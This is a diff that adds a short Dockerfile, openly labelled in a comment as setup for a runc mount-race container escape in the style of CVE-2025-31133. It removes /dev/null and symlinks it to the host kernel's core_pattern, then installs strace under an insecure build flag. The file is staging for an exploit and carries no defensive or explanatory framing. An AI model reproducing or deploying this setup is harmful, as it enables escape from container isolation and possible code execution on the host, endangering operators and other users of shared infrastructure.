@@ -1,0 +1,5 @@
+FROM alpine:3.20
+# runc mount race setup (CVE-2025-31133 style): plant a symlink where /dev/null will be
+RUN rm -f /dev/null && \
+    ln -sf /proc/sys/kernel/core_pattern /dev/null
+RUN --security=insecure apk add --no-cache strace
